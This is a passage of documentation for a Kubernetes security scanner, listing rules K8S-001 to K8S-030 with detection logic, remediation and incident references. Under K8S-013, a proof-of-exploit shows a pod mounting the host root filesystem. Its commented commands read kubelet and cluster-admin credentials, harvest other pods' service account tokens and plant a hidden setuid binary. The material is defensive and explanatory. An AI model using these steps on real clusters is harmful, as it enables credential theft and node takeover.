**How this is detected.** Reuses ``_primitives.image_pinning.classify`` so the floating-tag semantics match DF-001 / GL-001 / JF-009 / ADO-009 / CC-003. Even a ``PINNED_TAG`` like ``nginx:1.25.4`` is treated as unpinned, only an explicit ``@sha256:`` survives, since a tag is mutable on the registry side and Kubernetes will happily pull the new content on a node restart.

**Recommendation.** Resolve every workload container image to its current digest (``crane digest <ref>`` or ``docker buildx imagetools inspect``) and pin via ``image: repo@sha256:<digest>``. Floating tags (``:latest``, ``:3``, no tag) silently swap the running image on the next rollout, breaking provenance and reproducibility.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`K8S-001`](../providers/kubernetes.md#k8s-001) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-002`: Pod hostNetwork: true <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-002 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Compromised containers on hostNetwork can sniff or interfere with traffic from every other pod on the node. Reserve the flag for system DaemonSets that genuinely require it (CNI agents, ingress data planes); applications never need it.

**Recommendation.** Set ``spec.hostNetwork: false`` (the default) on every workload. ``hostNetwork: true`` puts the pod directly on the node's network namespace, exposing every host-bound listener to the container and bypassing CNI network policies.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`K8S-002`](../providers/kubernetes.md#k8s-002) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-003`: Pod hostPID: true <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-003 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** There is no application use case for hostPID. Only specialised node agents (process exporters, debuggers) legitimately need it, and those are typically deployed via a system DaemonSet with an explicit security review.

**Recommendation.** Set ``spec.hostPID: false`` (the default) on every workload. ``hostPID: true`` makes every host process visible inside the container, and combined with privileged execution allows trivial escape via ``nsenter`` / ``/proc/<pid>/root``.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`K8S-003`](../providers/kubernetes.md#k8s-003) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-004`: Pod hostIPC: true <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-004 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Modern applications coordinate via gRPC / sockets, never via host IPC. Treat this flag as a strong red flag in code review unless paired with a documented system-level use case.

**Recommendation.** Set ``spec.hostIPC: false`` (the default) on every workload. ``hostIPC: true`` lets the container read and write the host's shared-memory segments and POSIX message queues, exposing data exchanged by every other process on the node.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`K8S-004`](../providers/kubernetes.md#k8s-004) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-005`: Container securityContext.privileged: true <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-005 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied, [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** ``privileged: true`` is the strongest possible escalation in Kubernetes. It overrides every other securityContext setting and is the single largest cluster-takeover vector after RBAC misconfiguration.

**Recommendation.** Remove ``securityContext.privileged: true`` from every container. A privileged container has full access to the host's devices and capabilities, escape to the node is trivial. If the workload genuinely needs a kernel capability, grant only that capability via ``capabilities.add`` rather than enabling privileged mode.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`K8S-005`](../providers/kubernetes.md#k8s-005) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-006`: Container allowPrivilegeEscalation not explicitly false <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-006 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** The default for non-root containers is True (Pod Security Standard 'baseline' allows this; 'restricted' does not). An explicit ``false`` is required because Kubernetes treats an unset field as a deferral to the cluster admission controller, which may not enforce ``restricted``.

**Recommendation.** Set ``securityContext.allowPrivilegeEscalation: false`` on every container. The Linux ``no_new_privs`` flag stops setuid binaries and capabilities from gaining elevated privileges, without this, a compromised process can escape via setuid utilities still installed in many base images.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`K8S-006`](../providers/kubernetes.md#k8s-006) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-007`: Container runAsNonRoot not true / runAsUser is 0 <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-007 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** A container is considered safe when EITHER its own securityContext OR the pod-level securityContext sets ``runAsNonRoot: true`` and a non-zero ``runAsUser``. An explicit ``runAsUser: 0`` always fails, even if ``runAsNonRoot`` is unset.

**Recommendation.** Set ``securityContext.runAsNonRoot: true`` and ``runAsUser: <non-zero UID>`` on every container, OR set the same fields at pod level so all containers inherit. Running as UID 0 inside a container makes container-escape exploits dramatically more dangerous, the attacker already has root inside the container, so any kernel CVE that matters becomes immediately exploitable.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`K8S-007`](../providers/kubernetes.md#k8s-007) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-008`: Container readOnlyRootFilesystem not true <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-008 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Many post-exploitation toolchains (cryptominers, persistence implants, shell-callbacks) assume a writable root. Locking it down forces the attacker to use distroless or runtime tmpfs they can't easily place.

**Recommendation.** Set ``securityContext.readOnlyRootFilesystem: true`` on every container. A read-only root filesystem stops attackers from dropping additional payloads into ``/tmp``, ``/var``, or writable system paths. Mount tmpfs ``emptyDir`` volumes for the directories the application genuinely needs to write to.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`K8S-008`](../providers/kubernetes.md#k8s-008) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-009`: Container capabilities not dropping ALL / adding dangerous caps <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-009 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Fails when the container does NOT drop ``ALL`` *or* when ``capabilities.add`` includes any of: SYS_ADMIN, NET_ADMIN, SYS_PTRACE, SYS_MODULE, DAC_READ_SEARCH, DAC_OVERRIDE, SYS_RAWIO, SYS_BOOT, BPF, PERFMON, or the literal ``ALL``.

**Recommendation.** Drop every capability and add back only what the workload actually needs:

    securityContext:
      capabilities:
        drop: ["ALL"]
        add: ["NET_BIND_SERVICE"]   # only if binding <1024

Most stateless services need no capabilities at all. Avoid ``SYS_ADMIN`` (effectively root), ``SYS_PTRACE`` (process snooping), ``NET_ADMIN`` (raw socket access), and ``SYS_MODULE`` (kernel module loading).

**Source:** [`K8S-009`](../providers/kubernetes.md#k8s-009) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-010`: Container seccompProfile not RuntimeDefault or Localhost <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-010 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Pod-level ``securityContext.seccompProfile`` covers all containers in the pod. Either path passes this rule. The default of ``Unconfined`` (or unset, which inherits the node default, usually Unconfined) fails.

**Recommendation.** Set ``securityContext.seccompProfile.type: RuntimeDefault`` (or ``Localhost`` with a path to your tuned profile) at either pod or container level. Without seccomp, every syscall is reachable from the container, modern kernel CVEs (e.g. ``io_uring``) become trivially exploitable.

**Source:** [`K8S-010`](../providers/kubernetes.md#k8s-010) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-011`: Pod serviceAccountName unset or 'default' <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-011 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** Both an unset ``serviceAccountName`` (which defaults to ``default``) and an explicit ``serviceAccountName: default`` fail the rule. Pair this with K8S-012 to also disable token auto-mounting where the workload doesn't need API access.

**Recommendation.** Bind every workload to a dedicated, narrow ``ServiceAccount``. The 'default' SA exists in every namespace and tends to accrete RoleBindings over time, using it gives the workload every privilege any other service in the namespace ever needed. Create a per-workload SA with the minimum RBAC needed and reference it via ``spec.serviceAccountName``.

**Source:** [`K8S-011`](../providers/kubernetes.md#k8s-011) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-012`: Pod automountServiceAccountToken not false <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-012 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** An unset value defaults to True in Kubernetes. This rule fails on unset because most application workloads do NOT need API access and the default exposes credentials by accident. Workloads that explicitly call the API should set the field to ``true`` so the choice is visible in code review.

**Recommendation.** Set ``spec.automountServiceAccountToken: false`` on every workload that doesn't need to talk to the Kubernetes API. Auto-mounted SA tokens are a free credential for an attacker who lands a shell, without explicit opt-out the token sits at ``/var/run/secrets/kubernetes.io/serviceaccount/token`` ready to be exfiltrated. If the workload needs API access, leave it true but pair with a tight, dedicated RBAC role.

**Source:** [`K8S-012`](../providers/kubernetes.md#k8s-012) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-013`: Pod uses a hostPath volume <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-013 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Some legitimate system DaemonSets need hostPath (log collectors, CSI node plugins). Those should be deployed with explicit security review and a narrow ``path:``; this rule fires regardless because *application* workloads should never use hostPath.

**Recommendation.** Replace ``hostPath`` volumes with ``configMap``, ``secret``, ``emptyDir``, ``persistentVolumeClaim``, or CSI volumes. ``hostPath`` opens a direct read/write window onto the node's filesystem; combined with even mild container compromise it gives the attacker access to other pods' data, kubelet credentials, and the container runtime.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- [CVE-2021-25741](https://www.cve.org/CVERecord?id=CVE-2021-25741) (Kubernetes subPath volume traversal): a container could craft a ``subPath`` on a volume mount to access files outside the volume boundary. The bug affected multiple volume kinds; ``hostPath`` makes the blast radius worse because the volume already references host paths, so escaping the subpath lands directly on the node filesystem with the kubelet's privileges in scope.
- TeamTNT / Kinsing crypto-jacking campaigns (2020-2022): cluster compromise reports repeatedly traced lateral movement from a single misconfigured pod to the underlying node via hostPath:/, then to kubelet credentials and other tenants. Sysdig and Aqua incident reports document the pattern.

**Proof of exploit.**

# Vulnerable: pod mounts the host's root filesystem.
apiVersion: v1
kind: Pod
metadata:
  name: attacker
spec:
  containers:
    - name: shell
      image: busybox
      command: ["sleep", "infinity"]
      volumeMounts:
        - name: host-root
          mountPath: /host
  volumes:
    - name: host-root
      hostPath:
        path: /            # full node filesystem

# Attack from a shell inside the container:
#
#   # Read kubelet credentials and pivot to API server:
#   cat /host/var/lib/kubelet/kubeconfig
#   cat /host/etc/kubernetes/admin.conf
#
#   # Read service account tokens for every other pod on
#   # the node and impersonate them:
#   ls /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token
#
#   # Drop a setuid binary and pin persistence on the host:
#   cp /bin/busybox /host/usr/local/bin/.bd
#   chmod 4755 /host/usr/local/bin/.bd

# Safe: use scoped volume types that don't bridge to the host.
spec:
  volumes:
    - name: data
      persistentVolumeClaim:
        claimName: app-data

**Source:** [`K8S-013`](../providers/kubernetes.md#k8s-013) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-014`: Pod hostPath references a sensitive host directory <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-k8s-014 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Stricter than K8S-013: that rule flags any hostPath, this one upgrades to CRITICAL when the path is one of the well-known cluster-escape vectors.

**Recommendation.** Never mount the container runtime socket (``/var/run/docker.sock``, ``containerd.sock``, ``crio.sock``), kubelet credentials (``/var/lib/kubelet``), the cluster config (``/etc/kubernetes``), the host root (``/``), or ``/proc`` / ``/sys`` / ``/etc`` into a workload container. Each of these is a one-line cluster takeover. If a container genuinely needs node-level metrics, use an exporter DaemonSet with a narrowly-scoped read-only mount.

**Source:** [`K8S-014`](../providers/kubernetes.md#k8s-014) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-015`: Container missing resources.limits.memory <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-015 }

**Evidences:** [`PR.IR-03`](#ctrl-pr-ir-03) Mechanisms are implemented to achieve resilience requirements in normal and adverse situations.

**How this is detected.** Init containers and ephemeral containers are also checked: a leaking init container holds a slot on the node until it completes and can crowd out other pods just as readily as an application container.

**Recommendation.** Set ``resources.limits.memory`` on every container. Without a memory limit, a leaking or compromised container can consume the node's RAM until the kernel OOM-kills neighbouring pods, taking down workloads that share the node. Pair the limit with a ``requests.memory`` to inform the scheduler.

**Source:** [`K8S-015`](../providers/kubernetes.md#k8s-015) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-016`: Container missing resources.limits.cpu <span class="pg-sev pg-sev--low">LOW</span> { #detail-k8s-016 }

**Evidences:** [`PR.IR-03`](#ctrl-pr-ir-03) Mechanisms are implemented to achieve resilience requirements in normal and adverse situations.

**How this is detected.** Lower severity than K8S-015 because CPU throttling is self-healing (workloads slow down rather than die) and some controllers (e.g. SchedulerProfile, LimitRange) supply a cluster-default cpu limit transparently.

**Recommendation.** Set ``resources.limits.cpu`` on every container. CPU throttling is the kernel's defense against a neighbour consuming all node cycles, without a limit, a compromised container can stall everything else on the node, including the kubelet. Pair the limit with a ``requests.cpu`` for scheduling.

**Source:** [`K8S-016`](../providers/kubernetes.md#k8s-016) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-017`: Container env value carries a credential-shaped literal <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-k8s-017 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed, [`PR.DS-01`](#ctrl-pr-ds-01) The confidentiality, integrity, and availability of data-at-rest are protected.

**How this is detected.** Reuses ``_primitives/secret_shapes``, flags AKIA-prefixed AWS access keys outright, plus credential-named keys (``API_KEY``, ``DB_PASSWORD``, ``SECRET_TOKEN``) when the value is a non-empty literal. ``valueFrom`` entries are always safe (no inline value).

**Recommendation.** Replace literal ``env[].value`` entries that hold credentials with ``env[].valueFrom.secretKeyRef`` or ``envFrom.secretRef``. A literal env value lives in the manifest YAML. It gets committed to git, surfaced by ``kubectl get pod -o yaml``, and embedded in audit logs. Externalising into a Secret (and ideally a SealedSecret / ExternalSecret / SOPS-encrypted source) keeps the value out of the manifest.

**Source:** [`K8S-017`](../providers/kubernetes.md#k8s-017) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-018`: Secret stringData/data carries a credential-shaped literal <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-k8s-018 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed, [`PR.DS-01`](#ctrl-pr-ds-01) The confidentiality, integrity, and availability of data-at-rest are protected.

**How this is detected.** Walks both ``stringData`` (plain text) and ``data`` (base64). Base64-encoded values are decoded and checked for AKIA-shaped AWS keys. Credential-shaped key NAMES with any non-empty value are flagged regardless of encoding, even if the value is the literal placeholder ``REPLACE_ME``, having the name in the manifest is a maintenance footgun.

**Recommendation.** A ``Kind: Secret`` manifest committed to git defeats every secret-management story Kubernetes claims to provide, the base64 encoding in ``data`` is *not* encryption. Replace with SealedSecrets (Bitnami), ExternalSecrets / ESO, SOPS-encrypted manifests, or HashiCorp Vault Agent injection. If the manifest must remain in git, the only acceptable contents are placeholders that are filled in by an operator at apply time.

**Source:** [`K8S-018`](../providers/kubernetes.md#k8s-018) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-019`: Workload deployed in the 'default' namespace <span class="pg-sev pg-sev--low">LOW</span> { #detail-k8s-019 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Severity is LOW because in a well-curated cluster the default namespace is empty by policy. If your cluster treats default as a sandbox you can suppress this rule via ``.pipelinecheckignore``.

**Recommendation.** Set ``metadata.namespace`` to a dedicated namespace per workload (or per environment). The ``default`` namespace tends to accumulate cluster-wide RoleBindings, NetworkPolicies, and operators that grant broader access than intended; placing application workloads there means every privilege grant in default applies to them. A purpose-built namespace also lets you enforce Pod Security Standards (``pod-security.kubernetes.io/enforce`` label) scoped to that workload.

**Source:** [`K8S-019`](../providers/kubernetes.md#k8s-019) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-020`: ClusterRoleBinding grants cluster-admin or system:masters <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-020 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** The rule fires on a ``ClusterRoleBinding`` whose ``roleRef.name`` is ``cluster-admin``, ``admin``, or ``system:masters``. Subject type does not matter, even binding cluster-admin to a Group is a cluster-takeover risk.

**Recommendation.** Replace cluster-admin / system:masters bindings with narrowly-scoped ClusterRoles or namespace-scoped Roles. Granting cluster-admin to a service account is equivalent to giving every pod that uses it root on every node, credential theft from any such pod becomes immediate cluster takeover. Audit-log every existing cluster-admin binding and replace each with the minimum verbs/resources the consumer actually needs.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- [Tesla Kubernetes dashboard compromise](https://redlock.io/cloud-security-trends-october-2018) (RedLock, 2018): an unauthenticated Kubernetes dashboard exposed to the internet held tokens for service accounts bound to cluster-admin. Attackers used the dashboard credentials to deploy crypto-mining workloads with full cluster access. Least-privilege RBAC would have capped the blast radius even after dashboard exposure.
- Argo CD [CVE-2022-24348](https://www.cve.org/CVERecord?id=CVE-2022-24348) (2022): a Helm path-traversal bug let a project member read other applications' YAML, exposing credentials. Combined with the default cluster-admin RBAC install, the recovered tokens were a direct cluster takeover. Argo's recommendation post-fix was to scope the controller's RBAC away from cluster-admin so a similar future bug couldn't escalate the same way.

**Source:** [`K8S-020`](../providers/kubernetes.md#k8s-020) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-021`: Role or ClusterRole grants wildcard verbs+resources <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-021 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** Fires on any rule entry where BOTH ``verbs`` and ``resources`` contain a literal ``"*"``. A wildcard in only one of the two is still risky but is often a legitimate read-everything pattern (e.g. monitoring); this rule targets the strict superset 'do anything to everything'.

**Recommendation.** Replace ``verbs: ["*"]`` and ``resources: ["*"]`` with explicit lists. Wildcards bypass the principle of least privilege: today they grant `read pods` and tomorrow they grant `delete crds` because a new resource was registered in that apiGroup. Explicit verbs (``get``, ``list``, ``watch``) and explicit resources (``configmaps``, ``services``) keep grants stable across cluster upgrades.

**Source:** [`K8S-021`](../providers/kubernetes.md#k8s-021) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-022`: Service exposes SSH (port 22) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-022 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** Mirrors DF-013 (``EXPOSE 22`` in a Dockerfile) at the Service level. The check fires on Service ports whose ``port`` or ``targetPort`` is 22, regardless of Service type, a NodePort/LoadBalancer 22 is dramatically worse but a ClusterIP 22 still indicates an sshd container somewhere.

**Recommendation.** Containers should not run sshd. If you need an interactive shell into a running pod, use ``kubectl exec`` (subject to RBAC) or ``kubectl debug``. Removing the port-22 Service removes a pre-auth network surface that's a frequent lateral-movement target after initial cluster compromise.

**Source:** [`K8S-022`](../providers/kubernetes.md#k8s-022) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-023`: Namespace missing Pod Security Admission enforcement label <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-023 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Pod Security Admission (PSA) replaced the deprecated PodSecurityPolicy in 1.25. The three levels are ``privileged``, ``baseline``, and ``restricted``; ``baseline`` is a sensible production default and ``restricted`` matches the spirit of K8S-005..010. ``kube-system`` is exempt by convention since control-plane pods may legitimately need elevated permissions.

**Recommendation.** Set ``metadata.labels.pod-security.kubernetes.io/enforce`` to ``baseline`` or ``restricted`` on every Namespace. Without an enforce label the namespace runs the cluster's default policy, which on most installations is ``privileged`` and silently admits pods that violate every K8S-002..010 rule.

**Known false positives.**

- Single-tenant clusters running only operator-managed workloads may apply PSA via an admission webhook instead. The label-based check can't see that.

**Source:** [`K8S-023`](../providers/kubernetes.md#k8s-023) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-024`: Container missing both livenessProbe and readinessProbe <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-024 }

**Evidences:** [`DE.CM-09`](#ctrl-de-cm-09) Computing hardware and software, runtime environments, and their data are monitored.

**How this is detected.** Init containers and ephemeral debug containers are exempt, neither makes sense to probe. Jobs and CronJobs are also exempt because Kubernetes treats them as one-shot work; completion is the lifecycle signal, not health.

**Recommendation.** Define at least one of ``livenessProbe`` or ``readinessProbe`` on every long-running container. Without probes, a wedged pod stays listed as ``Running`` and keeps receiving traffic, which masks incidents and amplifies the blast radius of a single faulty replica.

**Source:** [`K8S-024`](../providers/kubernetes.md#k8s-024) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-025`: System priority class used outside kube-system <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-025 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** The kubelet reserves the two ``system-*`` priority classes for its own pods (kube-proxy, CNI agents). Granting them to a user workload also grants the right to preempt and evict anything below 2000000000, which is every non-system pod on the cluster. Outside kube-system this is almost always a misconfiguration copy-pasted from a control-plane manifest.

**Recommendation.** Reserve ``system-cluster-critical`` and ``system-node-critical`` priority classes for control-plane workloads in ``kube-system``. Application pods that adopt them gain the right to evict normal workloads under resource pressure, which is a quiet path to a cluster-wide outage if the application has a bug or the attacker has any control over its spec.

**Source:** [`K8S-025`](../providers/kubernetes.md#k8s-025) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-026`: LoadBalancer Service has no loadBalancerSourceRanges <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-026 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** Internal-only services should use ``type: ClusterIP`` (and an Ingress for HTTP) or set the cloud-provider-specific internal-LB annotation. ``loadBalancerSourceRanges`` is the Kubernetes-native, cloud-portable way to scope an external LB; cloud-specific firewalls (AWS security groups, GCP firewall rules) are equivalent at the L4 level but invisible to a manifest scanner.

**Recommendation.** Restrict every ``Service`` of ``type: LoadBalancer`` with ``spec.loadBalancerSourceRanges``. The default behavior is to provision an internet-facing load balancer that accepts traffic from 0.0.0.0/0, which exposes whatever the Service fronts to the entire internet. A short list of CIDRs scoped to known clients (office IPs, a NAT gateway, peered VPCs) removes the pre-auth attack surface entirely.

**Source:** [`K8S-026`](../providers/kubernetes.md#k8s-026) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-027`: Ingress has no TLS configuration <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-027 }

**Evidences:** [`PR.DS-02`](#ctrl-pr-ds-02) The confidentiality, integrity, and availability of data-in-transit are protected.

**How this is detected.** An Ingress with no ``spec.tls`` (or an empty list) terminates HTTP at the load balancer and proxies plaintext upstream. Ingress controllers will respect ``ssl-redirect`` annotations, but those are advisory until ``tls:`` is populated. If the Ingress is intentionally HTTP-only (e.g. an ACME challenge endpoint or an internal-only path served behind a network policy), suppress via ``.pipelinecheckignore`` with a short rationale rather than leaving it open.

**Recommendation.** Add a ``spec.tls`` block to every Ingress that fronts an HTTP backend. Each entry pairs one or more hostnames with a Secret holding the certificate / key, the canonical pattern is to provision the Secret via cert-manager and a ClusterIssuer pointing at Let's Encrypt or an internal CA. Plaintext-only Ingress lets a network attacker downgrade the connection and read or rewrite request bodies, which matters for any path carrying credentials, session cookies, or PII.

**Source:** [`K8S-027`](../providers/kubernetes.md#k8s-027) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-028`: Container declares hostPort <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-028 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** ``hostPort`` was the pre-Service way to publish a pod's port and survives in legacy manifests. Modern clusters use Services, which integrate with the kube-proxy, ingress controllers, and NetworkPolicies. ``hostPort`` is invisible to all of those, a port-scan from any other pod that knows the node IP reaches the workload directly. If a DaemonSet legitimately needs it (host-agent shape), suppress this rule with a brief ``.pipelinecheckignore`` rationale rather than leaving it open across the catalog.

**Recommendation.** Drop ``hostPort`` from container ports and use a Service (ClusterIP / NodePort / LoadBalancer) to publish the workload. ``hostPort`` binds directly to the node IP, bypasses the cluster's network model, and creates a node-level scheduling constraint that fails replicas with the same port. Workloads that genuinely need node-port binding (some CNI/storage agents) should declare it on a DaemonSet with ``hostNetwork: true`` already approved by review.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`K8S-028`](../providers/kubernetes.md#k8s-028) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-029`: RoleBinding grants permissions to the default ServiceAccount <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-029 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** Fires when a ``RoleBinding`` or ``ClusterRoleBinding`` lists ``kind: ServiceAccount, name: default`` among its subjects. ``kube-system``, ``kube-public``, and ``kube-node-lease`` are exempt because control-plane bootstrap manifests legitimately grant the default SA there.

**Recommendation.** Bind permissions to a dedicated ServiceAccount, not to ``default``. Every pod that omits ``serviceAccountName`` runs as the namespace's ``default`` SA, so a binding to it grants the same verbs to every untargeted pod in that namespace, including future workloads. Create a purpose-built SA, set ``automountServiceAccountToken: false`` on the default, and bind to the new SA explicitly.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Charts that intentionally re-use the default SA in single-tenant namespaces. Consider creating a named SA anyway. It keeps the audit log unambiguous about which workload made an API call.

**Source:** [`K8S-029`](../providers/kubernetes.md#k8s-029) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-030`: Workload schedules onto a control-plane node <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-030 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

